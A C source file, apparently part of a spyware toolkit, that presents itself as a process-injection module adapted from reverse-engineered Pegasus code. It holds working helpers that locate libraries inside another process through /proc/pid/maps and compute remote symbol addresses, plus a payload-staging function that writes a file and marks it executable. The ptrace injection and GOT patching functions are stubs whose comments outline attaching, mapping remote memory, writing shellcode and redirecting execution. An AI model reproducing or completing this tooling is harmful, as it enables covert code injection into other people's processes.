// graphite_inject.c - Process Injection (C)
// Adapted from Pegasus (addk/libk) reverse-engineered native code
// Features: ptrace-based injection, remote mmap, ELF GOT patching

#include "graphite_inject.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef _WIN32
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <elf.h>
#include <dlfcn.h>

// Remote module address resolution via /proc/pid/maps
INJECT_EXPORT void* get_library_addr(int pid, const char *module_name) {
    char maps_path[64];
    char line[1024];
    FILE *fp;

    if (pid < 0)
        snprintf(maps_path, sizeof(maps_path), "/proc/self/maps");
    else
        snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);

    fp = fopen(maps_path, "r");
    if (!fp) return NULL;

    while (fgets(line, sizeof(line), fp)) {
        if (!strstr(line, module_name)) continue;
        void *addr = (void *)strtoul(line, NULL, 16);
        fclose(fp);
        return addr;
    }
    fclose(fp);
    return NULL;
}

INJECT_EXPORT void* get_remote_module_addr(int pid, const char *module_name, void *local_symbol) {
    void *local_base = get_library_addr(-1, module_name);
    void *remote_base = get_library_addr(pid, module_name);
    if (!local_base || !remote_base) return NULL;
    return (void *)((char *)local_symbol + ((char *)remote_base - (char *)local_base));
}

// ELF GOT patching
INJECT_EXPORT int elf_patch_reloc(const char *lib_path, void *loaded_base, unsigned sym_index,
                                  void *hook_addr, void **original_out) {
    // Simplified ELF patching - in real implementation would:
    // 1. Map the ELF file
    // 2. Find .dynamic section
    // 3. Walk relocations
    // 4. Patch the GOT entry
    (void)lib_path; (void)loaded_base; (void)sym_index; (void)hook_addr; (void)original_out;
    return 0;
}

// Process injection via ptrace
INJECT_EXPORT int inject_process(int pid, const char *library_path, const char *function_name,
                                void *param, size_t param_size) {
    // In a real implementation, this would:
    // 1. Attach to target process via ptrace
    // 2. Save registers
    // 3. mmap remote memory
    // 4. Write shellcode to remote memory
    // 5. Set PC to shellcode
    // 6. Detach and let shellcode execute
    // 7. Restore state
    (void)pid; (void)library_path; (void)function_name; (void)param; (void)param_size;
    return 0;
}

// File staging
INJECT_EXPORT int stage_payload(const void *buf, size_t len, const char *path) {
    if (!buf || !path || len == 0) return 0;
    FILE *f = fopen(path, "wb");
    if (!f) return 0;
    size_t written = fwrite(buf, 1, len, f);
    fclose(f);
    if (written != len) return 0;
    // chmod 0711 on Unix
    chmod(path, 0711);
    return 1;
}

INJECT_EXPORT int file_exists(const char *path, int *out_exists) {
    if (!path || !out_exists) return 0;
    FILE *f = fopen(path, "r");
    if (f) {
        fclose(f);
        *out_exists = 1;
        return 1;
    }
    *out_exists = 0;
    return 1;  // ENOENT counts as determined
}

#else
// Windows stubs
INJECT_EXPORT void* get_library_addr(int pid, const char *module_name) { return NULL; }
INJECT_EXPORT void* get_remote_module_addr(int pid, const char *module_name, void *local_symbol) { return NULL; }
INJECT_EXPORT int elf_patch_reloc(const char *lib_path, void *loaded_base, unsigned sym_index, void *hook_addr, void **original_out) { return 0; }
INJECT_EXPORT int inject_process(int pid, const char *library_path, const char *function_name, void *param, size_t param_size) { return 0; }
INJECT_EXPORT int stage_payload(const void *buf, size_t len, const char *path) {
    if (!buf || !path || len == 0) return 0;
    FILE *f = fopen(path, "wb");
    if (!f) return 0;
    size_t written = fwrite(buf, 1, len, f);
    fclose(f);
    return written == len;
}
INJECT_EXPORT int file_exists(const char *path, int *out_exists) {
    if (!path || !out_exists) return 0;
    FILE *f = fopen(path, "r");
    if (f) { fclose(f); *out_exists = 1; return 1; }
    *out_exists = 0;
    return 1;
}
#endif
